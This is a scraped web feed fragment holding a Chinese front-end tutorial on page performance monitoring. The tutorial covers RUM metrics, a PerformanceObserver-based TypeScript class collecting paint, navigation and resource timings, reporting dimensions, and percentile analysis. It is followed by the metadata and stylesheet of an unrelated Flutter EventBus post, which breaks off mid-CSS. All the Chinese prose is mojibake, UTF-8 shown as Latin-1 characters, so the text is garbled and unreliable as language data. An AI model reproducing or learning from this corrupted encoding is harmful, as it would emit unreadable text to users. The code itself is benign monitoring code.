<p>é¡µé¢æ€§èƒ½ç›‘æ§çš„å¸¸è§æŒ‡æ ‡ç”¨äºè¡¡é‡å’Œä¼˜åŒ–ç”¨æˆ·åœ¨è®¿é—®ç½‘ç«™æˆ–åº”ç”¨æ—¶çš„ä½“éªŒã€‚é€šè¿‡è¿™äº›æŒ‡æ ‡ï¼Œå¼€å‘è€…å¯ä»¥äº†è§£åˆ°é¡µé¢åŠ è½½è¿‡ç¨‹ä¸­çš„ç“¶é¢ˆï¼Œå¹¶é’ˆå¯¹æ€§åœ°è¿›è¡Œä¼˜åŒ–ï¼Œä»è€Œ<strong>æé«˜é¡µé¢çš„å“åº”é€Ÿåº¦å’Œç¨³å®šæ€§</strong>ã€‚</p>
<p>ç›¸ä¿¡å‰ç«¯çš„æœ‹å‹ä»¬å¤šå¤šå°‘å°‘éƒ½çŸ¥é“ä¸€äº›ï¼ˆä¸ï¼Œæˆ‘ä¿¡ä½ ä¸€å®šçŸ¥é“ä¸€äº›ï¼‰å¸¸è§æŒ‡æ ‡ï¼Œå…³äºé¡µé¢æ€§èƒ½ç›‘æ§çš„æŒ‡æ ‡å¤§è‡´åˆ†ä¸ºå››ç±»ï¼š<strong>åŠ è½½æ€§èƒ½</strong>ã€<strong>äº¤äº’æ€§èƒ½</strong>ã€<strong>æ¸²æŸ“æ€§èƒ½</strong>å’Œ<strong>ç½‘ç»œæ€§èƒ½</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a54d92c0f5c48a8ae742213c9ce52dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=3J9f2e2XSEpaPQhxy8oUNGbdKHw%3D" alt="Clipboard_Screenshot_1765866403.png" loading="lazy"/></p>
<p>ï¼ˆå›¾ä¸­ä»…åˆ—ä¸¾éƒ¨åˆ†æŒ‡æ ‡ï¼‰</p>
<p>ä¸åŒå¤§ç±»çš„æŒ‡æ ‡é€šå¸¸è¡¡é‡ä¸åŒçš„åœºæ™¯çš„æ€§èƒ½æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç›¸åº”çš„éœ€æ±‚è¿›è¡Œç›¸åº”æŒ‡æ ‡çš„è·å–ã€‚æ¢å¥è¯è¯´ï¼Œæ¯ä¸ªæ€§èƒ½æŒ‡æ ‡éƒ½æœ‰è‡ªå·±ç‹¬ç‰¹çš„è¡¡é‡ä»·å€¼ï¼Œå„ä¸ªæ€§èƒ½æŒ‡æ ‡ç†åº”ç»¼åˆå…¨é¢çš„å»åˆ†æã€‚</p>
<p>ç”¨ä¸€ä¸ªæ—¶åºå›¾æ¥æ›´ç›´è§‚çš„ä½“ç°å‡ºæŸäº›æŒ‡æ ‡å¤„åœ¨çš„é˜¶æ®µï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cac0732e2324491b0ad219c196ce075~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=43IScXNdGf76CNFsQY2rhYzIy20%3D" alt="Clipboard_Screenshot_1765866417.png" loading="lazy"/></p>
<p>å¤§å¤šæ•°æŒ‡æ ‡æ˜¯æˆ‘ä»¬è¡¡é‡ç½‘é¡µåŠ è½½é€Ÿåº¦çš„é‡è¦ä¾æ®ï¼Œè¿™äº›æŒ‡æ ‡åœ¨çœŸå®ç›‘æ§ä¸­å¤§å¤šéƒ½å¯ä»¥é€šè¿‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FPerformance_API" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/API/Performance_API" ref="nofollow noopener noreferrer"><code>Performance API</code></a> è·å–/è®¡ç®—ï¼Œæ€»ä½“æ¥è®²è¿˜æ˜¯ç›¸å¯¹è½»æ¾çš„ï½</p>
<h3 data-id="heading-16">å°è£…ä¸€ä¸ªç®€å•è·å–RUMçš„ç±»</h3>
<p>åœ¨çœŸå®é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¸ä¼šé€ä¸ªç¼–å†™æ€§èƒ½æ•°æ®çš„è·å–é€»è¾‘ï¼Œå› ä¸ºè¿™ç§æ–¹å¼ä¸é€‚åˆå®é™…åº”ç”¨ã€‚æ›´å¥½çš„æ–¹æ³•æ˜¯é€šè¿‡ <code>PerformanceObserver</code> è¿›è¡Œå®æ—¶ç›‘å¬ï¼Œå¯¹æ‰€éœ€çš„æ€§èƒ½æ•°æ®è¿›è¡Œ<strong>åŠ¨æ€ç›‘æ§</strong>ã€‚ä¸€æ—¦ç›‘æµ‹åˆ°ç›¸åº”çš„æŒ‡æ ‡ï¼Œå°±ç«‹å³è¿›è¡Œæ•°æ®è·å–å’Œå¤„ç†ã€‚</p>
<p>è¿™é‡Œå†™ä¸€ä¸ªç›‘æµ‹å„ç±»ç®€å•æŒ‡æ ‡çš„ç±»åšä¸ªå°ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TIME</span> = <span class="hljs-number">100</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceMetrics</span> {
  private <span class="hljs-attr">metrics</span>: any = {};
  private <span class="hljs-attr">observer</span>: <span class="hljs-title class_">PerformanceObserver</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  private <span class="hljs-attr">promise</span>: <span class="hljs-title class_">Promise</span>&lt;any&gt;;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">collectPerformance</span>();
  }

	<span class="hljs-comment">// å¼€å§‹ç›‘å¬</span>
  private <span class="hljs-title function_">startObserving</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">observerCallback</span> = (<span class="hljs-params">list: PerformanceObserverEntryList, observer: PerformanceObserver</span>) =&gt; {
      list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
        <span class="hljs-comment">// ç›‘å¬å¯¼èˆªæ•°æ®</span>
        <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'navigation'</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">navigationStart</span> = entry.<span class="hljs-property">startTime</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">domContentLoaded</span> = entry.<span class="hljs-property">domContentLoadedEventEnd</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">loadEventEnd</span> = entry.<span class="hljs-property">loadEventEnd</span>;
        }

        <span class="hljs-comment">// ç›‘å¬ç»˜åˆ¶æ•°æ®</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'paint'</span>) {
          <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">name</span> === <span class="hljs-string">'first-paint'</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span> = entry.<span class="hljs-property">startTime</span>;
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">name</span> === <span class="hljs-string">'first-contentful-paint'</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> = entry.<span class="hljs-property">startTime</span>;
          }
        }

        <span class="hljs-comment">// ç›‘å¬èµ„æºåŠ è½½æ•°æ®</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'resource'</span> &amp;&amp; (entry.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'script'</span> || entry.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'link'</span>)) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span> || [];
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span>.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">name</span>: entry.<span class="hljs-property">name</span>,
            <span class="hljs-attr">duration</span>: entry.<span class="hljs-property">responseEnd</span> - entry.<span class="hljs-property">startTime</span>
          });
        }
      });

      <span class="hljs-comment">// å¦‚æœé‡è¦æ•°æ®æ”¶é›†å®Œæ¯•ï¼Œåœæ­¢ç›‘å¬</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span>) {
        observer.<span class="hljs-title function_">disconnect</span>();
      }
    };

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(observerCallback);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'navigation'</span>, <span class="hljs-string">'paint'</span>, <span class="hljs-string">'resource'</span>] });
  }

  <span class="hljs-comment">// æ”¶é›†æ€§èƒ½æ•°æ®</span>
  <span class="hljs-title function_">collectPerformance</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startObserving</span>();

        <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkMetricsReady</span> = (<span class="hljs-params"/>) =&gt; {
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span>) {
            <span class="hljs-title function_">resolve</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">setTimeout</span>(checkMetricsReady, <span class="hljs-variable constant_">TIME</span>);
          }
        };

        <span class="hljs-title function_">checkMetricsReady</span>();
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-title function_">reject</span>(error);
      }
    });
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getPerformance</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span>;
  }
}
</code></pre>
<p>ä½¿ç”¨èµ·æ¥ä¹Ÿéå¸¸ä¾¿æ·ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">PerformanceMetrics</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"xxx"</span>
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">const</span> pMs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceMetrics</span>()
<span class="hljs-keyword">const</span> perf = pMs.<span class="hljs-title function_">getPerformance</span>()
<span class="hljs-comment">// ...</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(perf)
</code></pre>
<p>åç»­æˆ‘ä»¬å¯ä»¥æ ¹æ®è·å–åˆ°çš„æŒ‡æ ‡è¿›è¡Œåˆ†æå¤„ç†â€¦</p>
<h3 data-id="heading-17">æ•°æ®ä¸ŠæŠ¥çš„ç»´åº¦</h3>
<p>è¿™é‡Œæˆ‘ä»¬ä¸è¯´å…·ä½“çš„ä¸ŠæŠ¥æ–¹æ³•ï¼Œè€Œæ˜¯æ¥è¯´ä¸€ä¸‹æ•°æ®ä¸ŠæŠ¥çš„ç»´åº¦ã€‚</p>
<p>ä¸ºäº†ç¡®ä¿æˆ‘ä»¬RUMåˆ†æçš„å…¨é¢æ€§ï¼Œæœ‰æ—¶ä»…æœ‰è¿™äº›æ€§èƒ½æŒ‡æ ‡çš„æ•°æ®æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œè¿˜éœ€è¦ä»å¤šä¸ªç»´åº¦ç»¼åˆè€ƒè™‘ã€‚æ•°æ®ä¸ŠæŠ¥çš„ç»´åº¦å¯ä»¥åˆ†ä¸º<strong>å¸¸è§„ç»´åº¦</strong>å’Œ<strong>ç‰¹æ®Šç»´åº¦ã€‚</strong></p>
<h4 data-id="heading-18">å¸¸è§„ç»´åº¦</h4>
<p>å¸¸è§„ç»´åº¦å…·æœ‰æ™®éæ€§å’ŒåŸºç¡€æ€§ï¼Œé€‚ç”¨äºå¤§å¤šæ•°çš„æ•°æ®æ”¶é›†å’Œç›‘æ§åœºæ™¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2103029ab461452c9e0d42434033e39c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=RoogVd6zX8kc8BK8lRFr6%2F%2FewOk%3D" alt="Clipboard_Screenshot_1765866434.png" loading="lazy"/></p>
<h4 data-id="heading-19">ç‰¹æ®Šç»´åº¦</h4>
<p>è¿™äº›ç»´åº¦ä¸»è¦ç”¨äºç‰¹å®šçš„åº”ç”¨åœºæ™¯æˆ–è€…è¿›è¡Œæ·±åº¦åˆ†ææ—¶ä½¿ç”¨ï¼Œé€šå¸¸ä¸ä¸šåŠ¡ç›¸å…³ï¼Œæˆ–ç”¨äºåˆ†ææ€§èƒ½å¼‚å¸¸å’Œç”¨æˆ·è¡Œä¸ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dc68440b6a84ea1bba0763e81495b84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=gdlPXzvxCQuHvpw1aalG9tvbZ5I%3D" alt="Clipboard_Screenshot_1765866441.png" loading="lazy"/></p>
<h2 data-id="heading-20">åˆ†ææ€§èƒ½æ•°æ®åŠå½±å“å› ç´ </h2>
<p>æ•°æ®è¾›è¾›è‹¦è‹¦é‡‡é›†åˆ°äº†ï¼Œåˆ†ææ•°æ®å°±åˆ«æå¾—è‰è‰ç‡ç‡çš„äº†ã€‚</p>
<h4 data-id="heading-21">æ—¶é—´åˆ†å¸ƒ</h4>
<p>æœ€å¸¸è§çš„åˆ†ææ€§èƒ½æ•°æ®çš„åˆ‡å…¥ç‚¹å°±æ˜¯æ—¶é—´åˆ†å¸ƒäº†ã€‚é€šå¸¸è¦ç»“åˆ<strong>å¹³å‡å€¼</strong>ã€<strong>ä¸­ä½æ•°</strong>å’Œ<strong>ç™¾åˆ†ä½æ•°</strong>æ¥è¿›è¡Œæ€§èƒ½è¯„ä¼°ï¼Œå•ä¸€åˆ†æä¸€æŒ‡æ ‡çš„è¯å¾€å¾€å®¹æ˜“è¯¯åˆ¤ç”¨æˆ·çœŸå®ä½“éªŒã€‚</p>
<ul>
<li>
<p>å¦‚æœæˆ‘åªçœ‹å¹³å‡å€¼</p>
<p>å‡è®¾ç½‘é¡µåŠ è½½æ—¶é—´çš„å¹³å‡å€¼æ˜¯<strong>3ç§’</strong>ï¼Œä½†å…¶ä¸­å°‘éƒ¨åˆ†ç”¨æˆ·å› ç½‘ç»œæ¡ä»¶å·®ï¼ŒåŠ è½½æ—¶é—´å¯èƒ½è¶…è¿‡<strong>10ç§’</strong>ã€‚è¿™äº›æç«¯å€¼ä¼šæ‹‰é«˜æ•´ä½“å¹³å‡å€¼ï¼Œ<strong>æ©ç›–äº†å¤§å¤šæ•°ç”¨æˆ·å®é™…è¾ƒå¥½çš„ä½“éªŒ</strong>ã€‚</p>
</li>
<li>
<p>å¦‚æœæˆ‘åªçœ‹ä¸­ä½æ•°</p>
<p>å¦‚æœä¸­ä½æ•°æ˜¯<strong>2.5ç§’</strong>ï¼Œè¯´æ˜ä¸€åŠç”¨æˆ·åŠ è½½æ—¶é—´ä½äºè¿™ä¸ªå€¼ã€‚è¿™æ¯”å¹³å‡å€¼æ›´ç¨³å®šï¼Œä½†ä¾ç„¶<strong>æ— æ³•ä½“ç°å°¾éƒ¨ç”¨æˆ·çš„æå·®ä½“éªŒ</strong>ã€‚</p>
</li>
<li>
<p>å¦‚æœæˆ‘åªçœ‹ç™¾åˆ†ä½æ•°</p>
<p>ï¼ˆä½ æƒ³çœ‹ç™¾åˆ†ä¹‹å¤šå°‘å‘¢ï¼Ÿï¼‰</p>
<p>å¯¹äºé«˜æ€§èƒ½è¦æ±‚çš„ä¸šåŠ¡ï¼Œ<strong>ä½ æ›´åº”è¯¥å…³æ³¨å°¾éƒ¨ç”¨æˆ·çš„ä½“éªŒ</strong>ï¼Œä¾‹å¦‚<strong>P95/P99</strong>ç­‰ã€‚ï¼ˆå¦‚æœP95ä¸º<strong>5ç§’</strong>ï¼Œæ„å‘³ç€<strong>95%<strong>çš„ç”¨æˆ·åŠ è½½æ—¶é—´ä½äº</strong>5</strong>ç§’ï¼Œè¿˜æœ‰**5%**ç”¨æˆ·æ¯”è¿™æ…¢ï¼‰</p>
</li>
</ul>
<p>æ‰€ä»¥åˆ†ææ€§èƒ½æŒ‡æ ‡æ—¶<strong>å»ºè®®å…³æ³¨ç™¾åˆ†ä½æ•°</strong>ï¼Œå¯¹æ€§èƒ½çš„è¦æ±‚è¶Šé«˜ï¼Œä½¿ç”¨è¶Šå¤§çš„ç™¾åˆ†ä½æ•°ï¼ŒåŒæ—¶åœ¨å…³æ³¨ç™¾åˆ†ä½æ•°çš„è¦ç»“åˆå¹³å‡å€¼å’Œä¸­ä½æ•°ä¸€èµ·åˆ†æã€‚</p>
<h4 data-id="heading-22">èµ„æºç±»å‹å½’ç±»</h4>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€‰æ‹©å¯¹èµ„æºç±»å‹è¿›è¡Œå½’ç±»åˆ†æï¼Œè¿™å…¶å®ä¹Ÿæ˜¯å¯¹æ€§èƒ½åˆ†æçš„ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„åœ°æ–¹ã€‚</p>
<p>è¯•æƒ³æ˜æ˜ä½ æƒ³åˆ†æé¦–é¡µåŠ è½½æ—¶é—´ï¼Œç»“æœç›¸å…³èµ„æºç›´æ¥åŠ è½½å¤±è´¥äº†ï¼Œç”šè‡³éƒ½åŠ è½½å‡ºæ¥ï¼Œè¿™è‚¯å®šæ˜¯åœ¨æ€§èƒ½ç›‘æ§åˆ†æä¹‹ä¸Šæ›´ä¸å¯èƒ½å®¹å¿çš„ã€‚</p>
<p>æŒ‰ç…§èµ„æºç±»å‹æ¥åˆ†æçš„å¸¸è§å†…å®¹æœ‰ï¼š</p>






























<table><thead><tr><th>èµ„æº</th><th>ç¤ºä¾‹</th><th>éƒ¨åˆ†åˆ†æ</th></tr></thead><tbody><tr><td>JavaScript</td><td>åº”ç”¨åŒ…ã€SDK</td><td>åŒ…ä½“ç§¯ã€æ‰§è¡Œæ—¶é—´ã€é•¿ä»»åŠ¡</td></tr><tr><td>CSS</td><td>ä¸»æ ·å¼ã€å­—ä½“åŠ è½½</td><td>é˜»å¡æ¸²æŸ“ã€æœªä½¿ç”¨æ ·å¼</td></tr><tr><td>å›¾ç‰‡</td><td>imgã€icon</td><td>æ˜¯å¦å‹ç¼©ã€æ‡’åŠ è½½</td></tr><tr><td>ç¬¬ä¸‰æ–¹èµ„æº</td><td>å¹¿å‘Š</td><td>æ˜¯å¦é˜»å¡åŠ è½½ã€é”™è¯¯ç‡</td></tr></tbody></table>
<h4 data-id="heading-23">ç¼“å­˜ä¸åŠ é€Ÿå› ç´ æ ‡è®°</h4>
<p>åœ¨åˆ†ææ€§èƒ½æ•°æ®çš„æ—¶å€™ï¼Œç¼“å­˜å’ŒæŸäº›åŠ é€Ÿå› ç´ ä¹Ÿä¼šå¯¹æ€§èƒ½åˆ†æé€ æˆä¸€å®šçš„â€œè¯¯åˆ¤â€å½±å“ã€‚å¥½æ¯”æ˜æ˜èµ„æºå¾ˆå¤§ï¼ŒåŠ è½½å¾ˆæ…¢ï¼Œç»“æœæµè§ˆå™¨ç¼“å­˜äº†ï¼Œé‚£æˆ‘ä»¬æ­¤æ—¶å†å»ç›‘æµ‹èµ„æºçš„è·å–æ—¶é—´å°±éå¸¸â€œé¸¡è‚‹â€äº†ã€‚</p>
<p>æœ‰ä¸€äº›ç›¸å¯¹æ¯”è¾ƒå¸¸è§çš„å› ç´ ï¼Œåœ¨åˆ†ææ—¶å¯ä»¥ç¨ä½œç•™æ„ï¼š</p>
<ul>
<li>æ˜¯å¦å‘½ä¸­æµè§ˆå™¨ç¼“å­˜/Service Worker</li>
<li>æ˜¯å¦å‘½ä¸­CDNåŠ é€ŸèŠ‚ç‚¹</li>
<li>DNSæ˜¯å¦èµ°äº†é¢„è§£æ</li>
</ul>
<h2 data-id="heading-24">å†™åœ¨æœ€å</h2>
<p>æœ¬æ–‡è®²çš„å†…å®¹å¤šä»¥æ¦‚å¿µæ€§çš„ä¸œè¥¿ä¸ºä¸»ï¼Œç®—ä¸ä¸Šæ·±å…¥æµ…å‡ºä¸è¿‡è¿˜æ˜¯å¸Œæœ›è¿™ç¯‡æ–‡ç« å¯ä»¥å¯¹ä½ æœ‰ä¸€äº›å¸®åŠ©ï¼Œæ­¤å¤–ï¼Œæ–‡ç« ä¸­ç›¸å¯¹ç»“åˆå®é™…è¾ƒå°‘ï¼Œç†è®ºæ€§çš„å†…å®¹ç»ˆç©¶è¿˜æ˜¯è¦é€šè¿‡å®è·µæ¥åŠ æ·±ç†è§£ã€‚</p>
<p>å¦‚æœæ–‡ç« é‡Œæœ‰é”™è¯¯æˆ–è€…éœ€è¦è¡¥å……çš„åœ°æ–¹å¯ä»¥åœ¨è¯„è®ºåŒºç•™è¨€ï¼Œå¦‚æœå¯ä»¥çš„è¯ä¹Ÿå¯ä»¥åœ¨è¯„è®ºåŒºè®¨è®ºäº¤æµå‘€ï¼Œæ„Ÿè°¢å¤§å®¶ğŸ™</p>
<p>ï¼ˆå¦‚æœçœŸçš„çœ‹åˆ°è¿™äº†ï¼Œå¯å¦ä¸‰è¿æ”¯æŒä¸‹å‘¢ï½ï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutter-ä½¿ç”¨EventBuså®ç°ç»„ä»¶é—´æ•°æ®é€šä¿¡]]></title>    <link>https://juejin.cn/post/7583226204036513833</link>    <guid>https://juejin.cn/post/7583226204036513833</guid>    <pubDate>2025-12-15T00:40:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583226204036513833" data-draft-id="7581117416811544619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" flutter-ä½¿ç”¨EventBuså®ç°ç»„ä»¶é—´æ•°æ®é€šä¿¡"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter,Android"/> <meta itemprop="datePublished" content="2025-12-15T00:40:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¹å¤šå¤š"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             flutter-ä½¿ç”¨EventBuså®ç°ç»„ä»¶é—´æ•°æ®é€šä¿¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¹å¤šå¤š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T00:40:53.000Z" title="Mon Dec 15 2025 00:40:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body 